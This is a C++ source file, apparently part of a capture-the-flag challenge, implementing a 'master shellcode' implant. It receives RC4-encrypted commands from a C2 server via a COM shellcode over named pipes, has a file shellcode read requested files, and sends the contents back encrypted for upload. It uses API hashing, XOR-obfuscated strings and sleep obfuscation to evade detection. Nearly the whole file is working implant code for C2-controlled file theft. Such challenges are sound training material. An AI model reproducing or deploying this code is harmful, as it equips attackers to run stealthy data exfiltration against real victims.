// Master Shellcode - Main orchestrator for the CTF challenge
// Coordinates communication between alarm, com, and file shellcodes
// Handles RC4 decryption of commands from C2

#include "api_hashing.hpp"
#include "config_type.hpp"
#include "memory.hpp"
#include "obfuscated_string.hpp"
#include "pipe_protocol.hpp"
#include "sleep_obfuscation.hpp"
#include "shellcode_config.hpp"
#include "rc4.hpp"

// Debug file helper - write state to C:\Users\root\master_debug.txt
void write_debug_state(const char* state, void* kernel32) {
    typedef HANDLE (WINAPI* fnCreateFileA)(const char*, uint32_t, uint32_t, LPSECURITY_ATTRIBUTES, uint32_t, uint32_t, HANDLE);
    typedef BOOL (WINAPI* fnWriteFile)(HANDLE, const void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnCloseHandle)(HANDLE);
    typedef uint32_t (WINAPI* fnSetFilePointer)(HANDLE, int32_t, int32_t*, uint32_t);

    fnCreateFileA fn_create_file = (fnCreateFileA)get_proc_address((HMODULE)kernel32, CREATEFILEA);
    fnWriteFile fn_write_file = (fnWriteFile)get_proc_address((HMODULE)kernel32, WRITEFILE);
    fnCloseHandle fn_close_handle = (fnCloseHandle)get_proc_address((HMODULE)kernel32, CLOSEHANDLE);
    fnSetFilePointer fn_set_file_pointer = (fnSetFilePointer)get_proc_address((HMODULE)kernel32, SETFILEPOINTER);

    if (!fn_create_file || !fn_write_file || !fn_close_handle) return;

    // Open/create debug file
    XOR_STR("C:\\Users\\root\\master_debug.txt", debug_file_path);
    HANDLE hFile = fn_create_file(
        debug_file_path,
        0x40000000,  // GENERIC_WRITE
        0x00000001,  // FILE_SHARE_READ
        NULL,
        4,  // OPEN_ALWAYS
        0x80,  // FILE_ATTRIBUTE_NORMAL
        NULL
    );

    if (hFile == (HANDLE)-1) return;

    // Seek to end
    if (fn_set_file_pointer) {
        fn_set_file_pointer(hFile, 0, NULL, 2);  // FILE_END
    }

    // Write state + newline
    uint32_t written = 0;
    uint32_t len = 0;
    while (state[len]) len++;

    fn_write_file(hFile, state, len, &written, NULL);
    fn_write_file(hFile, "\r\n", 2, &written, NULL);

    fn_close_handle(hFile);
}

// Helper to connect to a named pipe as client
HANDLE connect_to_pipe(const char* pipe_name, void* kernel32) {
    typedef HANDLE (WINAPI* fnCreateFileA)(const char*, uint32_t, uint32_t, LPSECURITY_ATTRIBUTES, uint32_t, uint32_t, HANDLE);
    typedef void (WINAPI* fnSleep)(uint32_t);

    fnCreateFileA fn_create_file_a = (fnCreateFileA)get_proc_address((HMODULE)kernel32, CREATEFILEA);
    fnSleep fn_sleep = (fnSleep)get_proc_address((HMODULE)kernel32, SLEEP);

    // Retry connection up to 10 times with 100ms delay
    for (int retry = 0; retry < 10; retry++) {
        HANDLE pipe = fn_create_file_a(
            pipe_name,
            0x40000000 | 0x80000000,  // GENERIC_READ | GENERIC_WRITE
            0,
            NULL,
            3,  // OPEN_EXISTING
            0,  // Synchronous mode - client pipes work better without FILE_FLAG_OVERLAPPED
            NULL
        );

        if (pipe != (HANDLE)-1) {
            return pipe;  // Success
        }

        // Pipe not ready, wait and retry
        if (retry < 9 && fn_sleep) {
            fn_sleep(100);  // Wait 100ms before retry
        }
    }

    return (HANDLE)-1;  // All retries failed
}

extern "C" __attribute__((section(".text$A"))) DWORD shellcode_main(LPVOID lpParameter) {
    (void)lpParameter;
    DEBUG("=== Master Shellcode Starting ===");

    // Flag part 3 hidden in shellcode (stack string)
    volatile char flag_part_3[] = {'F','L','A','G',' ','P','A','R','T','_','3',':',' ','o','L','_','P','4','r','7','Y','}','\0'};
    if (flag_part_3[0] == 'X') return 0;  // Never true, but prevents optimization

    // Initialize configuration
    config_t config = {0};
    if (init_shellcode_config(&config) != 0) {
        ERROR_LOG("Failed to initialize config");
        return 1;
    }

    // Get required functions
    typedef HANDLE (WINAPI* fnCreateNamedPipeA)(const char*, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, uint32_t, LPSECURITY_ATTRIBUTES);
    typedef BOOL (WINAPI* fnConnectNamedPipe)(HANDLE, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnDisconnectNamedPipe)(HANDLE);
    typedef BOOL (WINAPI* fnReadFile)(HANDLE, void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnWriteFile)(HANDLE, const void*, uint32_t, uint32_t*, LPOVERLAPPED);
    typedef BOOL (WINAPI* fnCloseHandle)(HANDLE);
    typedef void (WINAPI* fnExitThread)(uint32_t);
    typedef  DWORD (WINAPI* fnGetLastError)(void);

    fnCreateNamedPipeA fn_create_named_pipe_a = (fnCreateNamedPipeA)get_proc_address(config.kernel32, CREATENAMEDPIPEA);
    fnConnectNamedPipe fn_connect_named_pipe = (fnConnectNamedPipe)get_proc_address(config.kernel32, CONNECTNAMEDPIPE);
    fnDisconnectNamedPipe fn_disconnect_named_pipe = (fnDisconnectNamedPipe)get_proc_address(config.kernel32, DISCONNECTNAMEDPIPE);
    fnReadFile fn_read_file = (fnReadFile)get_proc_address(config.kernel32, READFILE);
    fnWriteFile fn_write_file = (fnWriteFile)get_proc_address(config.kernel32, WRITEFILE);
    fnCloseHandle fn_close_handle = (fnCloseHandle)get_proc_address(config.kernel32, CLOSEHANDLE);
    fnExitThread fn_exit_thread = (fnExitThread)get_proc_address(config.kernel32, EXITTHREAD);
    fnGetLastError fn_get_last_error = (fnGetLastError)get_proc_address(config.kernel32, GETLASTERROR);

    // Get CreateEventA function
    typedef HANDLE (WINAPI* fnCreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, const char*);
    fnCreateEventA fn_create_event_a = (fnCreateEventA)get_proc_address(config.kernel32, CREATEEVENTA);

    // Create event for overlapped I/O
    HANDLE connect_event = fn_create_event_a(NULL, TRUE, FALSE, NULL);  // Manual reset event
    if (!connect_event) {
        ERROR_LOG("Failed to create event");
        unload_shellcode_config(&config);
        SAFE_EXIT_THREAD(1);
    }

    // Create master named pipe server with overlapped flag
    XOR_STR("\\\\.\\pipe\\master", pipe_name);
    DEBUG("Creating master pipe: %s", pipe_name);

    HANDLE master_pipe = fn_create_named_pipe_a(
        pipe_name,
        0x00000003 | 0x40000000,  // PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED
        0x00000000,  // PIPE_TYPE_BYTE | PIPE_WAIT
        1,           // Max instances
        8192,        // Out buffer size
        8192,        // In buffer size
        0,           // Default timeout
        NULL
    );

    if (master_pipe == (HANDLE)-1) {
        ERROR_LOG("Failed to create master pipe");
        fn_close_handle(connect_event);
        unload_shellcode_config(&config);
        SAFE_EXIT_THREAD(1);
    }

    // Start async connection for alarm wakeup
    OVERLAPPED overlapped = {0};
    overlapped.hEvent = connect_event;
    fn_connect_named_pipe(master_pipe, &overlapped);  // Start listening asynchronously

    // Sleep obfuscation first - wait on event that signals when alarm connects
    DEBUG("Entering sleep obfuscation, waiting for alarm wakeup...");
    sleep_obfuscation(&config, connect_event);

    // When we wake up, connection is established
    DEBUG("Woke from sleep obfuscation, alarm connected!");

    pipe_msg_header_t header;
    uint32_t read = 0;
    fn_read_file(master_pipe, &header, sizeof(header), &read, NULL);

    if (read != sizeof(header) || header.type != PIPE_MSG_WAKEUP) {
        ERROR_LOG("Expected PIPE_MSG_WAKEUP from alarm");
        fn_disconnect_named_pipe(master_pipe);
        fn_close_handle(master_pipe);
        unload_shellcode_config(&config);
        SAFE_EXIT_THREAD(1);
    }

    INFO_SUCCESS("Received wakeup from alarm!");
    fn_disconnect_named_pipe(master_pipe);


    // Main command processing loop - run until QUIT command received
    int cmd_count = 0;
    bool should_quit = false;
    while (!should_quit) {
        cmd_count++;
        DEBUG("=== Processing command %d ===", cmd_count);


        // Connect to COM shellcode and send ready signal
        XOR_STR("\\\\.\\pipe\\com", com_pipe_name);
        DEBUG("Connecting to COM pipe...");

        HANDLE com_pipe = connect_to_pipe(com_pipe_name, config.kernel32);
        if (com_pipe == (HANDLE)-1) {
            ERROR_LOG("Failed to connect to COM pipe");
            break;  // Exit loop on connection failure
        }


        // Send ready signal to COM
        pipe_msg_header_t ready_header;
        ready_header.type = PIPE_MSG_READY;
        ready_header.size = 0;

        uint32_t written = 0;
        fn_write_file(com_pipe, &ready_header, sizeof(ready_header), &written, NULL);
        INFO_SUCCESS("Sent ready signal to COM");


        // Wait for encrypted command from COM (master sleeps/blocks on synchronous read)
        DEBUG("Waiting for command from COM (master sleeping on pipe read)...");
        fn_read_file(com_pipe, &header, sizeof(header), &read, NULL);
        DEBUG("header.type:%d,  header.size:%d", header.type, header.size);

        if (read != sizeof(header) || header.type != PIPE_MSG_COMMAND) {
            ERROR_LOG("Expected PIPE_MSG_COMMAND from COM");
            fn_close_handle(com_pipe);
            break;  // Exit loop on protocol error
        }


        // Read encrypted command data
        uint8_t* encrypted_cmd = (uint8_t*)alloc_mem(&config, header.size);
        if (!encrypted_cmd) {
            ERROR_LOG("Failed to allocate memory for command");
            fn_close_handle(com_pipe);
            break;  // Exit loop on allocation failure
        }

        if(!fn_read_file(com_pipe, encrypted_cmd, header.size, &read, NULL)) {
            ERROR_LOG("Failed to read from com pipe with error code: %p", fn_get_last_error());
            fn_close_handle(com_pipe);
            break;  // Exit loop on allocation failure
        }
        INFO_SUCCESS("Received encrypted command (%d bytes)", read);


        // Close COM pipe - we'll reconnect later to send response
        fn_close_handle(com_pipe);
        DEBUG("Closed COM pipe after receiving command");

        // Parse RC4 key and decrypt command
        // Format: [1 byte key_len][key_len bytes RC4 key][remaining bytes: encrypted file_path]
        if (header.size < 2) {
            ERROR_LOG("Command too small");
            dealloc_mem(&config, encrypted_cmd);
            break;  // Exit loop on invalid command
        }

        uint8_t key_len = encrypted_cmd[0];
        if (key_len == 0 || key_len > 32 || (1 + key_len) >= header.size) {
            ERROR_LOG("Invalid RC4 key length: %d", key_len);
            dealloc_mem(&config, encrypted_cmd);
            break;  // Exit loop on invalid key
        }

        uint8_t* rc4_key = encrypted_cmd + 1;
        uint8_t* encrypted_data = encrypted_cmd + 1 + key_len;
        size_t encrypted_data_len = header.size - 1 - key_len;

        DEBUG("RC4 key length: %d, encrypted data length: %zu", key_len, encrypted_data_len);

        // SAVE RC4 KEY for encrypting response later
        uint8_t saved_rc4_key[32];
        for (size_t i = 0; i < key_len; i++) {
            saved_rc4_key[i] = rc4_key[i];
        }
        uint8_t saved_key_len = key_len;

        // Decrypt the command using RC4
        rc4_crypt(rc4_key, key_len, encrypted_data, encrypted_data_len);

        // Parse command code (first byte of decrypted data)
        if (encrypted_data_len < 1) {
            ERROR_LOG("Decrypted command too small");
            dealloc_mem(&config, encrypted_cmd);
            fn_close_handle(com_pipe);
            break;
        }

        uint8_t cmd_code = encrypted_data[0];
        DEBUG("Command code: 0x%02X", cmd_code);


        // Check if this is a QUIT command
        if (cmd_code == CMD_QUIT) {
            INFO("Received QUIT command (0xFF), notifying all shellcodes...");
            should_quit = true;

            dealloc_mem(&config, encrypted_cmd);

            // Send QUIT notification to FILE shellcode
            XOR_STR("\\\\.\\pipe\\file", file_pipe_name_quit);
            DEBUG("Sending QUIT to file shellcode...");
            HANDLE file_pipe_quit = connect_to_pipe(file_pipe_name_quit, config.kernel32);
            if (file_pipe_quit != (HANDLE)-1) {
                pipe_msg_header_t quit_header;
                quit_header.type = PIPE_MSG_QUIT;
                quit_header.size = 0;
                fn_write_file(file_pipe_quit, &quit_header, sizeof(quit_header), &written, NULL);
                fn_close_handle(file_pipe_quit);
                INFO_SUCCESS("Sent QUIT to file shellcode");
            } else {
                ERROR_LOG("Failed to connect to file pipe for QUIT");
            }

            // Reconnect to COM to send empty response (so it can POST to C2)
            XOR_STR("\\\\.\\pipe\\com", com_pipe_name_resp);
            DEBUG("Reconnecting to COM to send empty response...");
            HANDLE com_pipe_resp = connect_to_pipe(com_pipe_name_resp, config.kernel32);
            if (com_pipe_resp != (HANDLE)-1) {
                pipe_msg_header_t http_resp_header;
                http_resp_header.type = PIPE_MSG_HTTP_RESPONSE;
                http_resp_header.size = 0;
                fn_write_file(com_pipe_resp, &http_resp_header, sizeof(http_resp_header), &written, NULL);
                fn_close_handle(com_pipe_resp);
                DEBUG("Sent empty response to COM for POST");
            }

            // Now send QUIT to COM shellcode (after it finishes POST)
            XOR_STR("\\\\.\\pipe\\com", com_pipe_name_quit);
            DEBUG("Sending QUIT to com shellcode...");
            HANDLE com_pipe_quit = connect_to_pipe(com_pipe_name_quit, config.kernel32);
            if (com_pipe_quit != (HANDLE)-1) {
                pipe_msg_header_t quit_header;
                quit_header.type = PIPE_MSG_QUIT;
                quit_header.size = 0;
                fn_write_file(com_pipe_quit, &quit_header, sizeof(quit_header), &written, NULL);
                fn_close_handle(com_pipe_quit);
                INFO_SUCCESS("Sent QUIT to com shellcode");
            } else {
                ERROR_LOG("Failed to connect to com pipe for QUIT");
            }

            INFO("All shellcodes notified, exiting loop");
            break;
        }

        // Copy decrypted command (including cmd_code) to send to file shellcode
        uint8_t* command_data = (uint8_t*)alloc_mem(&config, encrypted_data_len);
        if (!command_data) {
            ERROR_LOG("Failed to allocate command buffer");
            dealloc_mem(&config, encrypted_cmd);
            break;
        }
        for (size_t i = 0; i < encrypted_data_len; i++) {
            command_data[i] = encrypted_data[i];
        }

        dealloc_mem(&config, encrypted_cmd);

        // Parse command and delegate to file shellcode
        XOR_STR("\\\\.\\pipe\\file", file_pipe_name);
        DEBUG("Connecting to file pipe...");


        HANDLE file_pipe = connect_to_pipe(file_pipe_name, config.kernel32);
        if (file_pipe == (HANDLE)-1) {
            ERROR_LOG("Failed to connect to file pipe");
            break;  // Exit loop on connection failure
        }


        // Send command to file shellcode (all command types handled by file shellcode)
        pipe_msg_header_t file_req_header;
        file_req_header.type = PIPE_MSG_FILE_REQUEST;
        file_req_header.size = encrypted_data_len;

        fn_write_file(file_pipe, &file_req_header, sizeof(file_req_header), &written, NULL);
        fn_write_file(file_pipe, command_data, encrypted_data_len, &written, NULL);
        DEBUG("Sent command (code 0x%02X) to file shellcode (%zu bytes)", cmd_code, encrypted_data_len);


        // Wait for file response (master sleeps/blocks on synchronous read)
        DEBUG("Waiting for response from file shellcode (master sleeping on pipe read)...");
        fn_read_file(file_pipe, &header, sizeof(header), &read, NULL);


        if (read != sizeof(header) || header.type != PIPE_MSG_FILE_RESPONSE) {
            ERROR_LOG("Expected PIPE_MSG_FILE_RESPONSE from file shellcode");
            fn_close_handle(file_pipe);
            break;  // Exit loop on protocol error
        }

        // Read file content
        uint8_t* file_content = NULL;
        if (header.size > 0) {
            file_content = (uint8_t*)alloc_mem(&config, header.size);
            if (file_content) {
                fn_read_file(file_pipe, file_content, header.size, &read, NULL);
                INFO_SUCCESS("Received file content (%d bytes)", header.size);
            }
        } else {
            INFO("File not found or empty");
        }

        fn_close_handle(file_pipe);
        dealloc_mem(&config, command_data);

        // ENCRYPT file response with saved RC4 key before sending to COM
        if (header.size > 0 && file_content) {
            DEBUG("Encrypting response (%d bytes) with RC4 key", header.size);
            rc4_crypt(saved_rc4_key, saved_key_len, file_content, header.size);
        }

        // Reconnect to COM to send response
        XOR_STR("\\\\.\\pipe\\com", com_pipe_name_response);
        DEBUG("Reconnecting to COM pipe to send response...");


        HANDLE com_pipe_response = connect_to_pipe(com_pipe_name_response, config.kernel32);
        if (com_pipe_response == (HANDLE)-1) {
            ERROR_LOG("Failed to reconnect to COM pipe for response");
            if (file_content) {
                dealloc_mem(&config, file_content);
            }
            break;  // Exit loop on connection failure
        }


        // Send encrypted file content back to COM as HTTP response
        pipe_msg_header_t http_resp_header;
        http_resp_header.type = PIPE_MSG_HTTP_RESPONSE;
        http_resp_header.size = header.size;

        fn_write_file(com_pipe_response, &http_resp_header, sizeof(http_resp_header), &written, NULL);
        if (header.size > 0 && file_content) {
            fn_write_file(com_pipe_response, file_content, header.size, &written, NULL);
            DEBUG("Sent encrypted response to COM shellcode (%d bytes)", header.size);
        } else {
            DEBUG("Sent empty response to COM shellcode");
        }

        INFO_SUCCESS("Response encrypted and sent to COM");


        if (file_content) {
            dealloc_mem(&config, file_content);
        }

        fn_close_handle(com_pipe_response);

    } // End of command processing loop

    // Normal cleanup and exit
    fn_close_handle(master_pipe);
    fn_close_handle(connect_event);
    unload_shellcode_config(&config);
    SAFE_EXIT_THREAD(0);
}

#if VERBOSE >= 1
int main() {
    shellcode_main(NULL);
    return 0;
}
#endif
